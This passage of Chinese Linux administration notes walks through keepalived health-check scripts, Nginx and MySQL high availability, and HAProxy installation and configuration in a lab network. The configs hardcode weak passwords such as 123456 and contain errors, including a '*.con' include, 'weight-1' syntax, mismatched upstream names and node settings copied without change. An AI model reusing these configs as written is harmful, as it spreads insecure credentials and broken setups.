vrrp_script <SCRIPT_NAME> {    #定义一个检测脚本，在global_defs 之外配置
     script <STRING>|<QUOTED-STRING>   #shell命令或脚本路径
     interval <INTEGER>  #间隔时间，单位为秒，默认1秒
     timeout <INTEGER>   #超时时间
     weight <INTEGER:-254..254>  #默认为0,如果设置此值为负数，当上面脚本返回值为非0时，会将此值与本节点权重相加可以降低本节点权重，即表示fall. 如果是正数，当脚本返回值为
0，会将此值与本节点权重相加可以提高本节点权重，即表示 rise.通常使用负值
     fall <INTEGER>       #脚本几次失败转换为失败，建议设为2以上
     rise <INTEGER>       #脚本连续监测成功后，把服务器从失败标记为成功的次数
     user USERNAME [GROUPNAME]  #执行监测脚本的用户或组      
     init_fail         #设置默认标记为失败状态，监测成功之后再转换为成功状态
}
```

#### 42.6.2 利用脚本实现主从角色切换

![1656853778259](linux体系.assets/1656853778259.png)

**10.0.0.8**

```
#1.编写脚本
[root@ka1 conf.d]# cd /etc/keepalived/conf.d/

#1.1编写脚本avrrp_script.conf
[root@ka1 conf.d]# vim /etc/keepalived/keepalived.conf
! Configuration File for keepalived 
global_defs {
   notification_email {
     1805336068@qq.com
   }
   notification_email_from 1805336068@qq.com
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id ka1
   vrrp_skip_check_adv_addr
   vrrp_garp_interval 0
   vrrp_gna_interval 0
   vrrp_mcast_group4 234.6.6.6
}


#编写脚本
vrrp_script check_down {
   script "[ ! -f /etc/keepalived/down ]"
   interval 1
   weight -30
   fall 3
   rise 2
   timeout 2
}
include /etc/keepalived/conf.d/*.conf

#1.2调用脚本
[root@ka1 conf.d]# vim liu_vrrp.conf
vrrp_instance liu1 {
    state MASTER
    interface eth0
    virtual_router_id 66
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
     unicast_src_ip 10.0.0.8
     unicast_peer{
     10.0.0.18
   }
     notify_master "/etc/keepalived/notify.sh master"
     notify_backup "/etc/keepalived/notify.sh backup"
     notify_fault "/etc/keepalived/notify.sh fault"
       track_script {
       check_down    #调用脚本
    } 
}



#2.创建文件测试脚本是否有用？
[root@ka1 conf.d]# touch /etc/keepalived/down

#10.0.0.7上抓包
[root@rs1 ~]# tcpdump -i eth0 -nn src host 10.0.0.8 and dst host 10.0.0.18
00:52:09.801874 IP 10.0.0.8 > 10.0.0.18: VRRPv2, Advertisement, vrid 66, prio 100, authtype simple, intvl 1s, length 20
00:52:10.808489 IP 10.0.0.8 > 10.0.0.18: VRRPv2, Advertisement, vrid 66, prio 100, authtype simple, intvl 1s, length 20
00:52:19.288711 IP 10.0.0.8 > 10.0.0.18: VRRPv2, Advertisement, vrid 66, prio 70, authtype simple, intvl 1s, length 20
00:52:20.292686 IP 10.0.0.8 > 10.0.0.18: VRRPv2, Advertisement, vrid 66, prio 70, authtype simple, intvl 1s, length 20   #优先级降了30！！！

#现在是10.0.0.18的优先级高了
[root@rs1 ~]# tcpdump -i eth0 -nn src host 10.0.0.18 and dst host 10.0.0.8
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
00:55:09.839269 IP 10.0.0.18 > 10.0.0.8: VRRPv2, Advertisement, vrid 66, prio 80, authtype simple, intvl 1s, length 20
00:55:10.846730 IP 10.0.0.18 > 10.0.0.8: VRRPv2, Advertisement, vrid 66, prio 80, authtype simple, intvl 1s, length 20   #10.0.0.18的优先级是80
```

**10.0.0.18**

```
#1.编写脚本
[root@ka2 conf.d]# cd /etc/keepalived/conf.d/

#1.1编写脚本avrrp_script.conf放到全局配置里
root@ka2:/etc/keepalived/conf.d# vim /etc/keepalived/keepalived.conf
! Configuration File for keepalived
  
global_defs {
   notification_email {
     1805336068@qq.com
   }
   notification_email_from 1805336068@qq.com
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id ka2
   vrrp_skip_check_adv_addr
   vrrp_garp_interval 0
   vrrp_gna_interval 0
   vrrp_mcast_group4 234.6.6.6
}


#编写脚本
vrrp_script check_down {
   script "[ ! -f /etc/keepalived/down ]"
   interval 1
   weight -30
   fall 3
   rise 2
   timeout 2
 }
include /etc/keepalived/conf.d/*.conf


#1.2调用脚本
root@ka2:/etc/keepalived/conf.d# vim liu_vrrp.conf
vrrp_instance liu1 {
    state MASTER
    interface eth0
    virtual_router_id 66
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
     unicast_src_ip 10.0.0.8
     unicast_peer{
     10.0.0.18
   }
     notify_master "/etc/keepalived/notify.sh master"
     notify_backup "/etc/keepalived/notify.sh backup"
     notify_fault "/etc/keepalived/notify.sh fault"
       track_script {
       check_down    #调用脚本
    } 
}
```

#### 42.6.3单主模式的Nginx反向代理的高可用

![1656853778259](linux体系.assets/1656853778259.png)

**10.0.0.8**

```
#1.修改nginx配置文件实现反向代理
[root@ka1 conf.d]# yum -y install nginx
[root@ka1 conf.d]# vim /etc/nginx/nginx.conf
#在http语句块中添加
    upstream webservers {
         server 10.0.0.17:80;
         server 10.0.0.27:80;
    }
    
      location / {
         proxy_pass http://webservers;
    }
[root@ka1 conf.d]# nginx -s reload



#2.创建监控nginx脚本
[root@ka1 conf.d]# cd /etc/keepalived/conf.d/
[root@ka1 conf.d]# vim check_nginx.sh
#!/bin/bash
killall -0 nginx &> /dev/null
[root@ka1 conf.d]# chmod +x check_nginx.sh






#3.修改keepalived主配置文件
[root@ka1 conf.d]# cd /etc/keepalived/conf.d/
[root@ka1 conf.d]# vim /etc/keepalived/keepalived.conf
! Configuration File for keepalived
  
global_defs {
   notification_email {
     1805336068@qq.com
   }
   notification_email_from 1805336068@qq.com
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id ka1
   vrrp_skip_check_adv_addr
   vrrp_garp_interval 0
   vrrp_gna_interval 0
   vrrp_mcast_group4 234.6.6.6
}


vrrp_script check_down {
   script "[ ! -f /etc/keepalived/down ]"
   interval 1
   weight -30
   fall 3
   rise 2
   timeout 2
}
#添加监控nginx脚本路径
vrrp_script check_nginx {
   script "/etc/keepalived/conf.d/check_nginx.sh"
   interval 1
   weight -30
   fall 3
   rise 2
   timeout 2
}
include /etc/keepalived/conf.d/*.con





#4.子配置文件中调用脚本
[root@ka1 conf.d]# cd /etc/keepalived/conf.d/
[root@ka1 conf.d]# vim liu_vrrp.conf 

vrrp_instance liu1 {
    state MASTER
    interface eth0
    virtual_router_id 66
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
     unicast_src_ip 10.0.0.8
     unicast_peer{
     10.0.0.18
   }
     notify_master "/etc/keepalived/notify.sh master"
     notify_backup "/etc/keepalived/notify.sh backup"
     notify_fault "/etc/keepalived/notify.sh fault"
      track_script {
       check_down
       check_nginx  #调用nginx脚本
    }
}
[root@ka1 conf.d]# systemctl restart keepalived.service
```

**10.0.0.18**

```
#1.修改nginx配置文件实现反向代理
[root@ka2 conf.d]# yum -y install nginx
[root@ka2 conf.d]# vim /etc/nginx/nginx.conf
#在http语句块中添加
    upstream webservers {
         server 10.0.0.17:80;
         server 10.0.0.27:80;
    }
    
      location / {
         proxy_pass http://webservers;
    }
[root@ka1 conf.d]# nginx -s reload




#2.创建监控nginx脚本
[root@ka2 conf.d]# cd /etc/keepalived/conf.d/
[root@ka2 conf.d]# vim check_nginx.sh
#!/bin/bash
killall -0 nginx &> /dev/null
[root@ka1 conf.d]# chmod +x check_nginx.sh






#3.修改keepalived主配置文件
[root@ka2 conf.d]# cd /etc/keepalived/conf.d/
[root@ka2 conf.d]# vim /etc/keepalived/keepalived.conf
! Configuration File for keepalived
  
global_defs {
   notification_email {
     1805336068@qq.com
   }
   notification_email_from 1805336068@qq.com
   smtp_server 127.0.0.1
   smtp_connect_timeout 30
   router_id ka1
   vrrp_skip_check_adv_addr
   vrrp_garp_interval 0
   vrrp_gna_interval 0
   vrrp_mcast_group4 234.6.6.6
}


vrrp_script check_down {
   script "[ ! -f /etc/keepalived/down ]"
   interval 1
   weight -30
   fall 3
   rise 2
   timeout 2
}
#添加监控nginx脚本路径
vrrp_script check_nginx {
   script "/etc/keepalived/conf.d/check_nginx.sh"
   interval 1
   weight -30
   fall 3
   rise 2
   timeout 2
}
include /etc/keepalived/conf.d/*.con





#4.子配置文件中调用脚本
[root@ka2 conf.d]# cd /etc/keepalived/conf.d/
[root@ka2 conf.d]# vim liu_vrrp.conf 

vrrp_instance liu1 {
    state MASTER
    interface eth0
    virtual_router_id 66
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 123456
    }
    virtual_ipaddress {
        10.0.0.10/24 dev eth0 label eht0:1
    }
     unicast_src_ip 10.0.0.8
     unicast_peer{
     10.0.0.18
   }
     notify_master "/etc/keepalived/notify.sh master"
     notify_backup "/etc/keepalived/notify.sh backup"
     notify_fault "/etc/keepalived/notify.sh fault"
      track_script {
       check_down
       check_nginx  #调用nginx脚本
    }
}
[root@ka2 conf.d]# systemctl restart keepalived.service
```

#### 42.6.4双主模式Nginx反向代理的高可用

![1656853778259](linux体系.assets/1656853778259.png)

```
#在两个节点都配置nginx反向代理
[root@ka1-centos8 ~]vim /etc/nginx/nginx.conf
http {
 upstream websrvs {
 server 10.0.0.7:80 weight=1;
 server 10.0.0.17:80 weight-1;
 }
 
  upstream websrvs2 {
    server 10.0.0.27:80 weight=1;
    server 10.0.0.37:80 weight-1;
 }
 server {
    listen 80;
    server_name www.a.com;
    location /{
      proxy_pass http://webservs/;
    }
 }
 server {
 listen 80;
 server_name www.b.com;
 location /{
 proxy_pass http://webservs2/;
      }
   }
}


#在两个节点都配置实现双主模式的nginx反向代理高可用
[root@ka1-centos8 ~]#cat /etc/keepalived/keepalived.conf
! Configuration File for keepalived
 global_defs {
 notification_email {
 root@localhost
 }
 
 notification_email_from kaadmin@localhost
 smtp_server 127.0.0.1
 smtp_connect_timeout 30
 router_id ka1.magedu.org #在另一个节点为ka2.magedu.org
 vrrp_mcast_group4 224.100.100.100
}

vrrp_script check_nginx {
   script "/etc/keepalived/check_nginx.sh"
   #script "/usr/bin/killall -0 nginx"
   interval 1
   weight -30
   fall 3
   rise 5
   timeout 2 
 }
 
vrrp_instance VI_1 {
   state MASTER #在另一个节点为BACKUP
   interface eth0
   virtual_router_id 66
   priority 100 #在另一个节点为80
   advert_int 1
   authentication {
   auth_type PASS
   auth_pass 123456
 }
 virtual_ipaddress {
 10.0.0.10/24 dev eth0 label eth0:1
 }
 track_interface {
 eth0
 }
 notify_master "/etc/keepalived/notify.sh master"
 notify_backup "/etc/keepalived/notify.sh backup"
 notify_fault "/etc/keepalived/notify.sh fault"
 track_script {
 check_nginx
  }
}
vrrp_instance VI_2 {
   state BACKUP #在另一个节点为MASTER
   interface eth0
   virtual_router_id 88
   priority 80 #在另一个节点为100
   advert_int 1
   authentication {
   auth_type PASS
   auth_pass 123456
 }
 virtual_ipaddress {
    10.0.0.20/24 dev eth0 label eth0:2
 }
 
 track_interface {
 eth0
 }
 notify_master "/etc/keepalived/notify.sh master"
 notify_backup "/etc/keepalived/notify.sh backup"
 notify_fault "/etc/keepalived/notify.sh fault"
 track_script {
    check_nginx
  }
}
[root@ka1-centos8 ~]# yum install psmisc -y
[root@ka1-centos8 ~]# cat /etc/keepalived/check_nginx.sh
#!/bin/bash
/usr/bin/killall -0 nginx
[root@ka1-centos8 ~]# chmod a+x /etc/keepalived/check_nginx.sh
```

#### 42.6.5MySQL双主模式的高可用

![1656856789221](linux体系.assets/1656856789221.png)

```
#先实现MySQL的双主架构
[root@ka1-centos8 ~]#vim /etc/my.cnf.d/mariadb-server.cnf 
[mysqld]
server-id=8
log-bin
auto_increment_offset=1         #开始点
auto_increment_increment=2      #增长幅度  

#在ka2第二个节点创建连接MySQL查看同步状态的授权用户
[root@ka2-centos8 ~]#mysql -uroot -p123456
MariaDB [(none)]> grant replication slave on *.* to repluser@'10.0.0.%' 
identified by '123456'; 

#实现MySQL的健康性检测脚本1
[root@ka1-centos8 ~]#vi /etc/keepalived/check_mysql.sh
#!/bin/bash
slave_is=( $(mysql -uroot -p123456 -h10.0.0.18 -e "show slave status\G" | grep 
"Slave_.*_Running:" | awk '{print $2}') )
if [ "${slave_is[0]}" = "Yes" -a "${slave_is[1]}" = "Yes" ];then
 exit 0
else
 exit 1
fi

#实现MySQL的健康性检测脚本2
[root@ka1-centos8 ~]#vi /etc/keepalived/check_mysql.sh
mysqladmin -uroot -p123456  ping &> /dev/null

#实现MySQL的健康性检测脚本3
[root@ka1-centos8 ~]#vi /etc/keepalived/check_mysql.sh
mysql  -uroot -p123456 -e 'status' &> /dev/null

#实现MySQL的健康性检测脚本4
[root@ka1-centos8 ~]#vi /etc/keepalived/check_mysql.sh
systemctl is-active mariadb &> /dev/null

#配置keepalived调用上面脚本
[root@ka1-centos8 ~]#cat /etc/keepalived/keepalived.conf
! Configuration File for keepalived
 global_defs {
   notification_email {
   root@localhost
 }
 notification_email_from kaadmin@localhost
 smtp_server 127.0.0.1
 smtp_connect_timeout 30
 router_id ka1.magedu.org #在另一个节点为ka2.magedu.org
 vrrp_mcast_group4 224.0.100.100
}

vrrp_script check_mysql { #只需在第一个节点上实现脚本
   script "/etc/keepalived/check_mysql.sh"
   interval 1
   weight -30
   fall 3
   rise 2
   timeout 2 
 }
 
vrrp_instance VI_1 {
  state MASTER #在另一个节点为BACKUP
  interface eth0
  virtual_router_id 66
  priority 100 #在另一个节点为80
  advert_int 1
  authentication {
  auth_type PASS
  auth_pass 123456
 }
 
 virtual_ipaddress {
  10.0.0.10/24 dev eth0 label eth0:1
 }
 
 track_interface {
   eth0
 }
 
 notify_master "/etc/keepalived/notify.sh master"
 notify_backup "/etc/keepalived/notify.sh backup"
 notify_fault "/etc/keepalived/notify.sh fault"
   track_script {
       check_mysql #只需在第一个节点上实现脚本
   }
}
```

## 43.企业级HAPROXY

### 43.1HAProxy安装及基础配置

**介绍HAProxy的基础安装及基础配置**

![1656931889650](linux体系.assets/1656931889650.png)

#### 43.1.1 Ubuntu安装

社区版网站：http://www.haproxy.org/

![1656932171317](linux体系.assets/1656932171317.png)

![1656932195047](linux体系.assets/1656932195047.png)

```
[root@ubuntu1804 ~]# apt-get install --no-install-recommends software-properties-common -y
[root@ubuntu1804 ~]# add-apt-repository ppa:vbernat/haproxy-2.4
[root@ubuntu1804 ~]# apt-get install haproxy=2.4.\* -y
```

#### 43.1.2 CentOS安装

官方没有提供rpm相关的包,可以通过第三方仓库的rpm包

从第三方网站下载rpm包：https://pkgs.org/download/haproxy

![1656933706257](linux体系.assets/1656933706257.png)

![1656933894175](linux体系.assets/1656934210637.png)

```
#1.安装依赖包
[root@centos8 ~]# yum -y install wget
[root@centos8 ~]# wget http://mirror.centos.org/centos/7/sclo/x86_64/rh/Packages/r/rh-haproxy18-haproxy-1.8.24-2.el7.x86_64.rpm
[root@centos8 ~]# wget http://mirror.centos.org/centos/7/sclo/x86_64/rh/Packages/r/rh-haproxy18-runtime-3.1-2.el7.x86_64.rpm
[root@centos8 ~]# yum -y install rh-haproxy18-runtime-3.1-2.el7.x86_64.rpm
[root@centos8 ~]# yum -y install rh-haproxy18-haproxy-1.8.24-2.el7.x86_64.rpm




#2.创建软链接
[root@centos8 ~]# ln -s /opt/rh/rh-haproxy18/root/usr/sbin/haproxy /usr/sbin/
[root@centos8 ~]# haproxy -v
HA-Proxy version 1.8.24 2020/02/15
Copyright 2000-2020 Willy Tarreau <willy@haproxy.org>




#3.启动服务
[root@centos8 ~]# systemctl start rh-haproxy18-haproxy.service
[root@centos8 ~]# systemctl status rh-haproxy18-haproxy.service
```

#### 43.1.3 编译安装

```
#1.升级lua库
[root@centos7 ~]# cd /usr/local/src
[root@centos7 haproxy-2.4.17]# curl -R -O http://www.lua.org/ftp/lua-5.4.4.tar.gz
[root@centos7 haproxy-2.4.17]# tar zxf lua-5.4.4.tar.gz
[root@centos7 haproxy-2.4.17]# cd lua-5.4.4
[root@centos7 lua-5.4.4]# make all test
[root@centos7 lua-5.4.4]# mkdir /usr/local/lua
[root@centos7 lua-5.4.4]# mv src/ /usr/local/lua




#2.安装包
[root@centos7 ~]# yum -y install gcc openssl-devel pcre-devel systemd-devel




#3.下载源码包 需要科学上网
[root@centos7 ~]# wget http://www.haproxy.org/download/2.4/src/haproxy-2.4.17.tar.gz
[root@centos7 ~]# tar xvf haproxy-2.4.17.tar.gz -C /usr/local/src
[root@centos7 ~]# cd /usr/local/src
[root@centos7 src]# cd haproxy-2.4.17/





#4.进行编译安装
[root@centos7 haproxy-2.4.17]# pwd
/usr/local/src/haproxy-2.4.17
[root@centos7 haproxy-2.4.17]# make ARCH=x86_64 TARGET=linux-glibc USE_PCRE=1 USE_OPENSSL=1 USE_ZLIB=1 USE_SYSTEMD=1 USE_LUA=1 LUA_INC=/usr/local/lua/src/ LUA_LIB=/usr/local/lua/src/
[root@centos7 haproxy-2.4.17]# make install PREFIX=/apps/haproxy
[root@centos7 haproxy-2.4.17]# tree /apps/
/apps/
└── haproxy
    ├── doc
    │   └── haproxy
    │       ├── 51Degrees-device-detection.txt
    │       ├── architecture.txt
    │       ├── close-options.txt
    │       ├── configuration.txt
    │       ├── cookie-options.txt
    │       ├── DeviceAtlas-device-detection.txt
    │       ├── intro.txt
    │       ├── linux-syn-cookies.txt
    │       ├── lua.txt
    │       ├── management.txt
    │       ├── netscaler-client-ip-insertion-protocol.txt
    │       ├── network-namespaces.txt
    │       ├── peers.txt
    │       ├── peers-v2.0.txt
    │       ├── proxy-protocol.txt
    │       ├── regression-testing.txt
    │       ├── seamless_reload.txt
    │       ├── SOCKS4.protocol.txt
    │       ├── SPOE.txt
    │       └── WURFL-device-detection.txt
    ├── sbin
    │   └── haproxy
    └── share
        └── man
            └── man1
                └── haproxy.1

7 directories, 22 files




#5.创建软链接
[root@centos7 haproxy-2.4.17]# ln -s /apps/haproxy/sbin/haproxy /usr/sbin/
[root@centos7 haproxy-2.4.17]# haproxy -v
HAProxy version 2.4.17-9f97155 2022/05/13 - https://haproxy.org/
Status: long-term supported branch - will stop receiving fixes around Q2 2026.
Known bugs: http://www.haproxy.org/bugs/bugs-2.4.17.html
Running on: Linux 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64




#6.创建HAProxy启动文件
[root@centos7 haproxy-2.4.17]# vim /usr/lib/systemd/system/haproxy.service
[Unit]
Description=HAProxy Load Balancer
After=syslog.target network.target

[Service]
ExecStartPre=/usr/sbin/haproxy -f /etc/haproxy/haproxy.cfg -c -q
ExecStart=/usr/sbin/haproxy -Ws -f /etc/haproxy/haproxy.cfg -p /var/lib/haproxy/haproxy.pid
ExecReload=/bin/kill -USR2 $MAINPID
LimitNOFILE=100000

[Install]
WantedBy=multi-user.target






#7.创建自定义配置文件
[root@centos7 haproxy-2.4.17]# mkdir /etc/haproxy
[root@centos7 haproxy-2.4.17]# vim /etc/haproxy/haproxy.cfg
global
    maxconn 100000
    chroot /apps/haproxy
    stats socket /var/lib/haproxy/haproxy.sock mode 600 level admin
    #uid 99
    #gid 99
    user haproxy
    group haproxy
    daemon
    pidfile /var/lib/haproxy/haproxy.pid
    log 127.0.0.1 local2 info

defaults
   option http-keep-alive
   option forwardfor
   maxconn 100000
   mode http
   timeout connect 300000ms
   timeout client 300000ms
   timeout server 300000ms

listen stats
   mode http
   bind 0.0.0.0:9999
   stats enable
   log global
   stats uri    /haproxy-status
   stats auth   haadmin:123456

listen web_port
   bind 10.0.0.17:80
   mode http
   log global
   server web1 127.0.0.1:8080 check inter 3000 fall 2 rise 5





#8.创建存放PID文件
[root@centos7 haproxy-2.4.17]# mkdir /var/lib/haproxy
[root@centos7 haproxy-2.4.17]# useradd -r -s /sbin/nologin haproxy
[root@centos7 haproxy-2.4.17]# systemctl enable --now haproxy
```

![1656950314523](linux体系.assets/1656950314523.png)

### 43.2 基础配置详解

配置文件官方帮助文档

```
http://cbonte.github.io/haproxy-dconv/
http://cbonte.github.io/haproxy-dconv/2.1/configuration.html
```

![1656950688409](linux体系.assets/1656950688409.png)

![1656950701045](linux体系.assets/1656950701045.png)

![1656950738482](linux体系.assets/1656950738482.png)

#### 43.2.1 global配置

```
#1.global配置参数说明
chroot  #锁定运行目录
deamon  #后台运行
stats socket /var/lib/haproxy/haproxy.sock mode 600 level admin process 1
#socket文件
user, group, uid, gid  #运行haproxy的用户身份
nbproc   n #开启的haproxy work 进程数，默认进程数是一个
#nbthread 1 #和多进程 nbproc配置互斥（版本有关,CentOS8的haproxy1.8无此问题）,指定每个haproxy进程开启的线程数，默认为每个进程一个线程
#如果同时启用nbproc和nbthread 会出现以下日志的错误，无法启动服务
Apr  7 14:46:23 haproxy haproxy: [ALERT] 097/144623 (1454) : config : cannot enable multiple processes if multiple threads are configured. Please use either nbproc or nbthread but not both.
cpu-map 1 0     #绑定haproxy worker 进程至指定CPU，将第1个work进程绑定至0号CPU
cpu-map 2 1     #绑定haproxy worker 进程至指定CPU，将第2个work进程绑定至1 号CPU
maxconn n   #每个haproxy进程的最大并发连接数
maxsslconn n   #每个haproxy进程ssl最大连接数,用于haproxy配置了证书的场景下
maxconnrate n   #每个进程每秒创建的最大连接数量
spread-checks n #错开流量高峰，建议2-5(20%-50%)之间，默认值0
pidfile  #指定pid文件路径
log 127.0.0.1 local2 info   #定义全局的syslog服务器；日志服务器需要开启UDP协议，最多可以定义两个







#2.案例：多进程和线程
[root@centos7 ~]#vim /etc/haproxy/haproxy.cfg
global
maxconn 100000
chroot /apps/haproxy
stats socket /var/lib/haproxy/haproxy.sock1 mode 600 level admin process 1  #socket文件和进程关联     
stats socket /var/lib/haproxy/haproxy.sock2 mode 600 level admin process 2  #socket文件和进程关联 
uid 99
gid 99
daemon
nbproc 2
[root@centos7 ~]#systemctl restart haproxy
[root@centos7 ~]#ll /var/lib/haproxy/
```

#### 43.2.2 HAProxy日志配置

```
#1.概述
HAproxy本身不记录客户端的访问日志.此外为减少服务器负载,一般生产中HAProxy不记录日志.也可以配置HAProxy利用rsyslog服务记录日志到指定日志文件中





#2.案例 发送日志道10.0.0.8的Rsyslog上
#10.0.0.17机器上
[root@centos7 ~]# vim /etc/haproxy/haproxy.cfg
global
    maxconn 100000
    chroot /apps/haproxy
    #stats socket /var/lib/haproxy/haproxy.sock mode 600 level admin
    stats socket /var/lib/haproxy/haproxy.sock1 mode 600 level admin process 1
    stats socket /var/lib/haproxy/haproxy.sock2 mode 600 level admin process 2
    #uid 99
    #gid 99
    user haproxy
    group haproxy
    daemon
    nbproc 2
    pidfile /var/lib/haproxy/haproxy.pid
    log 127.0.0.1 local2 info
    log 10.0.0.8 local6 info  #添加这行

[root@centos7 ~]# systemctl restart haproxy



#10.0.0.8机器上
[root@centos8 ~]# vim /etc/rsyslog.conf
module(load="imudp") #注释打开
input(type="imudp" port="514")  #注释打开


# Save boot messages also to boot.log
local7.*                                                /var/log/boot.log
local6.*                                                /var/log/haproxy.log   #添加这行
[root@centos8 ~]# systemctl restart rsyslog
[root@centos8 ~]# tail -f /var/log/haproxy.log
```

#### 43.2.3 Proxies配置

```
#1.Proxies配置
官方文档：http://cbonte.github.io/haproxy-dconv/2.1/configuration.html#4
defaults [<name>] #默认配置项，针对以下的frontend、backend和listen生效，可以多个name也可以没有name
frontend <name>   #前端servername，类似于Nginx的一个虚拟主机 server和LVS服务集群。
backend <name>   #后端服务器组，等于nginx的upstream和LVS中的RS服务器
listen   <name>   #将frontend和backend合并在一起配置，相对于frontend和backend配置更简洁，生产常用




#2.Proxies配置-defaults
defaults 配置参数：
option redispatch     #当server Id对应的服务器挂掉后，强制定向到其他健康的服务器，重新派发
option abortonclose   #当服务器负载很高时，自动结束掉当前队列处理比较久的连接，针对业务情况选择开启
option http-keep-alive #开启与客户端的会话保持
option forwardfor     #透传客户端真实IP至后端web服务器
mode http|tcp #设置默认工作类型,使用TCP服务器性能更好，减少压力
timeout http-keep-alive 120s #session 会话保持超时时间，此时间段内会转发到相同的后端服务器
timeout connect 120s #客户端请求从haproxy到后端server最长连接等待时间(TCP连接之前)，默认单位ms
timeout server 600s #客户端请求从haproxy到后端服务端的请求处理超时时长(TCP连接之后)，默认单位ms，如果超时，会出现502错误，此值建议设置较大些，访止502错误
timeout client 600s #设置haproxy与客户端的最长非活动时间，默认单位ms，建议和timeout server相同
timeout check   5s   #对后端服务器的默认检测超时时间
default-server inter 1000 weight 3   #指定后端服务器的默认设置





#3.Proxies配置-listen简化配置
#官网业务访问入口
listen WEB_PORT_80 
   bind 10.0.0.7:80  
   mode http
   option forwardfor
   server web1   10.0.0.17:8080   check inter 3000 fall 3 rise 5
   server web2   10.0.0.27:8080   check inter 3000 fall 3 rise 5
   
   
   

#4.Proxies配置-frontend
bind： #指定HAProxy的监听地址，可以是IPV4或IPV6，可以同时监听多个IP或端口，可同时用于
listen字段中

#格式：
bind [<address>]:<port_range> [, ...] [param*]
#注意：如果需要绑定在非本机的IP，需要开启内核参数：net.ipv4.ip_nonlocal_bind=1
backlog <backlog> #针对所有server配置,当前端服务器的连接数达到上限后的后援队列长度，注意：不支持backend






#5.Proxies配置-backend
定义一组后端服务器，backend服务器将被frontend进行调用。
注意: backend 的名称必须唯一,并且必须在listen或frontend中事先定义才可以使用,否则服务无法启动

mode http|tcp     #指定负载协议类型,和对应的frontend必须一致
option #配置选项
server   #定义后端real server,必须指定IP和端口

注意：option后面加 httpchk，smtpchk,mysql-check,pgsql-check，ssl-hello-chk方法，可用于实现更多应用层检测功能


server 配置
#针对一个server配置
check #对指定real进行健康状态检查，如果不加此设置，默认不开启检查,只有check后面没有其它配置也可以启用检查功能
      #默认对相应的后端服务器IP和端口,利用TCP连接进行周期性健康性检查,注意必须指定端口才能实现健康性检查
 addr <IP>   #可指定的健康状态监测IP，可以是专门的数据网段，减少业务网络的流量
 port <num> #指定的健康状态监测端口
 inter <num> #健康状态检查间隔时间，默认2000 ms
 fall <num>   #后端服务器从线上转为线下的检查的连续失效次数，默认为3
 rise <num>   #后端服务器从下线恢复上线的检查的连续有效次数，默认为2
weight <weight> #默认为1，最大值为256，0(状态为蓝色)表示不参与负载均衡，但仍接受持久连接
backup #将后端服务器标记为备份状态,只在所有非备份主机down机时提供服务，类似Sorry Server
disabled #将后端服务器标记为不可用状态，即维护状态，除了持久模式，将不再接受连接,状态为深黄色，优雅下线
redirect prefix http://www.baidu.com/ #将请求临时(302)重定向至其它URL，只适用于http模式
redir http://www.baidu.com      #将请求临时(302)重定向至其它URL，只适用于http模式
maxconn <maxconn> #当前后端server的最大并发连接数





#6.frontend+backend 配置实例
范例1：
frontend magedu-test-http
 bind :80,:8080
 mode tcp
 use_backend magedu-test-http-nodes
backend magedu-test-http-nodes
 mode tcp
 default-server inter 1000 weight 6  
 server web1 10.0.0.17:80 weight 2 check addr 10.0.0.117 port 8080
 server web1 10.0.0.27:80 check
 
 
范例2：
#官网业务访问入口
frontend WEB_PORT_80
   bind 10.0.0.7:80
   mode http
   use_backend web_prot_http_nodes
backend web_prot_http_nodes
   mode http
   option forwardfor
   server 10.0.0.17 10.0.0.17:8080   check inter 3000 fall 3 rise 5  
   server 10.0.0.27 10.0.0.27:8080   check inter 3000 fall 3 rise 5
```

注意：name字段只能使用大小写字母，数字，‘-’(dash)，'_‘(underscore)，'.' (dot)和 ':'(colon)，并且严格区分大小写

![1656990579229](linux体系.assets/1656990579229.png)

##### 43.2.3.1环境部署

![1656990498300](linux体系.assets/1656990498300.png)

**10.0.0.17**

```
#haproxy
[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg
global
    maxconn 100000
    chroot /apps/haproxy
    #stats socket /var/lib/haproxy/haproxy.sock mode 600 level admin
    stats socket /var/lib/haproxy/haproxy.sock1 mode 600 level admin process 1
    stats socket /var/lib/haproxy/haproxy.sock2 mode 600 level admin process 2
    #uid 99
    #gid 99
    user haproxy
    group haproxy
    daemon
    nbproc 2

    cpu-map 1 0
    cpu-map 2 1
    pidfile /var/lib/haproxy/haproxy.pid
    #log 127.0.0.1 local2 info
    log 10.0.0.18 local6 info

defaults
   option http-keep-alive
   option forwardfor
   maxconn 100000
   mode http
   timeout connect 300000ms
   timeout client 300000ms
   timeout server 300000ms

listen stats
   mode http
   bind 0.0.0.0:9999
   stats enable
   log global
   stats uri    /haproxy-status
   stats auth   haadmin:123456

#加前后端
frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers  #前端调用后端

backend liu_webservers
   server rs1 10.0.0.18:80 check inter 3000 fall 3 rise 5
   server rs2 10.0.0.28:80 check inter 3000 fall 3 rise 5
   server local 127.0.0.1:8080 backup   #本机作为备用服务器
# 页面写到 echo SorryServer > /usr/share/nginx/html/index.html
   
#listen liu_web_80
   #bind 10.0.0.17:80
   #server rs1 10.0.0.18:80 check inter 3000 fall 3 rise 5 #反向代理
   #server rs2 10.0.0.28:80 check inter 3000 fall 3 rise 5  #反向代理
 [root@haproxy ~]# haproxy -c -f /etc/haproxy/haproxy.cfg  #语法检查  
[root@haproxy ~]# systemctl reload haproxy
```

**10.0.0.18**

```
#rs1
root@rs1:~# yum -y install httpd;systemctl enable --now httpd;echo this is rs1 10.0.0.18 > /var/www/html/index.html
```

**10.0.0.28**

```
#rs2
[root@rs2 ~]# yum -y install httpd;systemctl enable --now httpd;echo this is rs2 10.0.0.28 > /var/www/html/index.html

```

**10.0.0.7**

```
#客户端
[11:25:26 root@centos7 ~]# curl 10.0.0.17
this is rs1 10.0.0.18
